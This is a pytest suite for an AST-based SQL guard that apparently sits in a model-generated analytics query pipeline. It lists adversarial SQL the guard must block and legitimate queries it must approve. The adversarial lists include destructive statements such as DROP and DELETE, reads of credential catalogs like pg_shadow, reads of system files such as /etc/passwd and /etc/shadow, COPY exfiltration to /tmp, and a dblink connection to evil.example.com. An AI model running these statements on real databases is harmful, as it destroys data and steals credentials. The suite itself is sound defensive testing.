"""AST guard test suite — Phase 01 checkpoint.

Runs with no API key, no database, no network: `pytest api/tests/test_ast_guard.py`.
Two suites:

  * ADVERSARIAL  — must ALL be blocked (`ok is False`). This is the CI gate
    described in the plan's evaluation section: one leak fails the build.
  * LEGITIMATE   — realistic analytics questions that must ALL pass, so the
    guard's false-positive rate is exercised alongside its true-positive
    rate (a guard people route around because it rejects real queries is
    worse than no guard at all).
"""

from __future__ import annotations

import pytest

from app.guards.ast_guard import DEFAULT_ROW_CAP, check
from app.guards.errors import RejectReason, TERMINAL_REASONS

# ---------------------------------------------------------------------------
# Adversarial suite — grouped to match the bypass table in the project plan,
# plus categories that table didn't have room for.
# ---------------------------------------------------------------------------

STACKED_STATEMENTS = [
    "SELECT 1; DROP TABLE orders",
    "SELECT * FROM orders; DELETE FROM customers",
    "SELECT 1; SELECT 2; SELECT 3",
    "SELECT 1;;DROP TABLE orders;",
]

#: Splicing a comment INTO a keyword (not between two whole tokens) is how
#: this bypass defeats a regex/blocklist scanner: `'DROP' not in sql.upper()`
#: is true for `DR/*x*/OP`. Sent to the real Postgres lexer, though, a split
#: keyword is just two bad tokens — always a syntax error, never a silent
#: bypass. That's the point of parsing instead of pattern-matching: this
#: whole attack class collapses to one outcome (SYNTAX_ERROR) instead of
#: needing its own detector. (Comments between *complete* tokens, like
#: `SELECT/*x*/1`, are ordinary valid SQL and must NOT be rejected — see
#: test_legitimate_query_is_approved for the equivalent positive case.)
COMMENT_AND_WHITESPACE_SPLICES = [
    "SEL/**/ECT 1",
    "DR/*x*/OP TABLE orders",
    "TRUN/**/CATE orders",
    "SE\tLECT 1",
]

DML_INSIDE_CTE = [
    "WITH d AS (DELETE FROM orders RETURNING *) SELECT * FROM d",
    "WITH u AS (UPDATE orders SET status = 'paid' RETURNING id) SELECT * FROM u",
    "WITH i AS (INSERT INTO orders (id) VALUES (1) RETURNING id) SELECT * FROM i",
    "WITH RECURSIVE d AS (DELETE FROM orders WHERE id < 10 RETURNING id) SELECT * FROM d",
    "SELECT * FROM (WITH x AS (DELETE FROM customers RETURNING *) SELECT * FROM x) sub",
]

FUNCTION_SIDE_EFFECTS = [
    "SELECT pg_sleep(9999)",
    "SELECT pg_sleep(1) FROM orders",
    "SELECT * FROM orders WHERE 1=1 AND pg_sleep(5) IS NULL",
    "SELECT lo_import('/etc/passwd')",
    "SELECT lo_export(12345, '/tmp/exfil')",
    "SELECT * FROM pg_read_file('/etc/passwd', 0, 1000)",
    "SELECT pg_read_binary_file('/etc/shadow')",
    "SELECT * FROM pg_ls_dir('/var/lib/postgresql')",
    "SELECT set_config('session_replication_role', 'replica', false)",
    "SELECT pg_terminate_backend(pg_backend_pid())",
    "SELECT dblink_connect('host=evil.example.com')",
    "SELECT pg_advisory_lock(1)",
    "SELECT (SELECT set_config('x', 'y', false))",  # nested in a subquery target list
]

CATALOG_EXFILTRATION = [
    "SELECT * FROM pg_shadow",
    "SELECT usename, passwd FROM pg_shadow",
    "SELECT * FROM pg_catalog.pg_authid",
    "SELECT * FROM information_schema.tables",
    "SELECT * FROM information_schema.columns",
    "SELECT * FROM pg_roles",
    "SELECT * FROM pg_settings",
    "SELECT * FROM pg_stat_activity",
]

DOLLAR_QUOTED_AND_PROCEDURAL = [
    "DO $$ BEGIN DELETE FROM orders; END $$",
    "DO $tag$ BEGIN DROP TABLE customers; END $tag$",
    "CALL some_procedure()",
    "CREATE FUNCTION evil() RETURNS void AS $$ DELETE FROM orders $$ LANGUAGE sql",
]

OTHER_STATEMENT_TYPES = [
    "DROP TABLE orders",
    "TRUNCATE orders",
    "ALTER TABLE orders ADD COLUMN hacked text",
    "CREATE TABLE evil (id int)",
    "CREATE TABLE t AS SELECT * FROM orders",
    "GRANT ALL ON orders TO PUBLIC",
    "COPY orders TO '/tmp/exfil.csv'",
    "COPY orders FROM '/tmp/inject.csv'",
    "VACUUM orders",
    "LOCK TABLE orders IN ACCESS EXCLUSIVE MODE",
    "SET statement_timeout = 0",
    "PREPARE x AS SELECT 1",
    "EXECUTE x",
    "SELECT * INTO new_orders FROM orders",
]

LOCKING_AND_MISC = [
    "SELECT * FROM orders FOR UPDATE",
    "SELECT * FROM orders o FOR SHARE OF o",
    "SELECT * FROM orders FOR UPDATE NOWAIT",
    "SELECT * FROM orders FOR KEY SHARE",
]

MALFORMED_INPUT = [
    "",
    "   ",
    "\n\t",
    "SELECT * FROM orders WHERE (",
    "'; DROP TABLE orders; --",
]

ADVERSARIAL_SUITE: list[str] = (
    STACKED_STATEMENTS
    + COMMENT_AND_WHITESPACE_SPLICES
    + DML_INSIDE_CTE
    + FUNCTION_SIDE_EFFECTS
    + CATALOG_EXFILTRATION
    + DOLLAR_QUOTED_AND_PROCEDURAL
    + OTHER_STATEMENT_TYPES
    + LOCKING_AND_MISC
    + MALFORMED_INPUT
)


def test_adversarial_suite_has_at_least_fifty_cases():
    # The plan's Phase 01 checkpoint is "50/50 hostile inputs blocked" —
    # this guards against someone quietly shrinking the suite later.
    assert len(ADVERSARIAL_SUITE) >= 50, len(ADVERSARIAL_SUITE)


@pytest.mark.parametrize("sql", ADVERSARIAL_SUITE)
def test_adversarial_input_is_blocked(sql: str):
    result = check(sql)
    assert result.ok is False, f"guard let through: {sql!r}"
    assert result.reason is not None
    assert result.safe_sql is None


@pytest.mark.parametrize(
    "sql",
    STACKED_STATEMENTS
    + DML_INSIDE_CTE
    + FUNCTION_SIDE_EFFECTS
    + CATALOG_EXFILTRATION
    + OTHER_STATEMENT_TYPES
    + LOCKING_AND_MISC,
)
def test_safety_violations_are_terminal_not_repairable(sql: str):
    # These are security events, not modelling mistakes — the pipeline must
    # never feed the rejection reason back to the model as a retry hint.
    # (Malformed/comment-splice inputs are syntax errors, which ARE
    # repairable, so they're excluded from this particular assertion.)
    result = check(sql)
    assert result.ok is False
    assert result.reason in TERMINAL_REASONS, (
        f"{sql!r} rejected as {result.reason}, which is repairable — "
        "a write/injection attempt must be terminal"
    )


# ---------------------------------------------------------------------------
# Legitimate suite — realistic analytics questions the guard must not
# false-positive on. Runs against the view names from db/00_schema.sql.
# ---------------------------------------------------------------------------

LEGITIMATE_QUERIES = [
    "SELECT count(*) FROM analytics.v_orders",
    "SELECT status, count(*) FROM analytics.v_orders GROUP BY status",
    """
    SELECT c.region, sum(oi.quantity * oi.unit_price) AS revenue
    FROM analytics.v_orders o
    JOIN analytics.v_order_items oi ON oi.order_id = o.id
    JOIN analytics.v_customers c ON c.id = o.customer_id
    WHERE o.ordered_at >= now() - interval '30 days'
    GROUP BY c.region
    ORDER BY revenue DESC
    """,
    """
    WITH monthly AS (
        SELECT date_trunc('month', ordered_at) AS month, count(*) AS n
        FROM analytics.v_orders
        GROUP BY 1
    )
    SELECT month, n, n - lag(n) OVER (ORDER BY month) AS delta
    FROM monthly
    ORDER BY month
    """,
    "SELECT * FROM analytics.v_products WHERE unit_price_usd BETWEEN 10 AND 50 LIMIT 25",
    """
    SELECT p.name, avg(r.rating) AS avg_rating, count(*) AS n_reviews
    FROM analytics.v_reviews r
    JOIN analytics.v_products p ON p.id = r.product_id
    GROUP BY p.name
    HAVING count(*) >= 5
    ORDER BY avg_rating DESC
    """,
    "SELECT DISTINCT state FROM analytics.v_customers WHERE state IS NOT NULL",
    """
    SELECT o.id, o.ordered_at, sum(oi.quantity * oi.unit_price) AS total
    FROM analytics.v_orders o
    JOIN analytics.v_order_items oi ON oi.order_id = o.id
    WHERE o.customer_id = 42
    GROUP BY o.id, o.ordered_at
    """,
    "SELECT count(*) FILTER (WHERE status = 'refunded') AS refund_count FROM analytics.v_orders",
    "SELECT/*inline comment between real tokens*/id FROM analytics.v_orders",
]


@pytest.mark.parametrize("sql", LEGITIMATE_QUERIES)
def test_legitimate_query_is_approved(sql: str):
    result = check(sql)
    assert result.ok is True, f"false positive on legitimate query: {result.detail}\n{sql}"
    assert result.safe_sql is not None


def test_approved_sql_gets_a_row_cap_when_absent():
    result = check("SELECT id FROM analytics.v_orders")
    assert result.ok is True
    assert f"LIMIT {DEFAULT_ROW_CAP}" in result.safe_sql


def test_approved_sql_keeps_an_explicit_lower_limit():
    result = check("SELECT id FROM analytics.v_orders LIMIT 5")
    assert result.ok is True
    assert "LIMIT 5" in result.safe_sql
    assert f"LIMIT {DEFAULT_ROW_CAP}" not in result.safe_sql


def test_reject_reason_is_specific_not_generic():
    # Every rejection should be attributable to one of the taxonomy's named
    # reasons — a generic "invalid" would defeat the repair/block split.
    assert check("SELECT pg_sleep(1)").reason == RejectReason.UNSAFE_FUNCTION
    assert check("DROP TABLE orders").reason == RejectReason.DISALLOWED_STATEMENT_TYPE
    assert check("SELECT 1; SELECT 2").reason == RejectReason.MULTI_STATEMENT
    assert check("SEL 1").reason == RejectReason.SYNTAX_ERROR
    assert check("").reason == RejectReason.EMPTY_STATEMENT
    assert check("SELECT * FROM orders FOR UPDATE").reason == RejectReason.LOCKING_CLAUSE
    assert check("SELECT * FROM pg_shadow").reason == RejectReason.CATALOG_SCHEMA_ACCESS


def test_reoutput_sql_is_deparsed_from_the_checked_tree():
    # The string that reaches the database is regenerated from the AST the
    # guard just approved, not the caller's original text — the whole point
    # is that there's no gap between "checked" and "executed".
    result = check("select   id,name   from orders   where id=1")
    assert result.ok is True
    assert "select" not in result.safe_sql  # deparser normalizes casing/whitespace
    assert "SELECT id, name FROM orders WHERE id = 1" in result.safe_sql
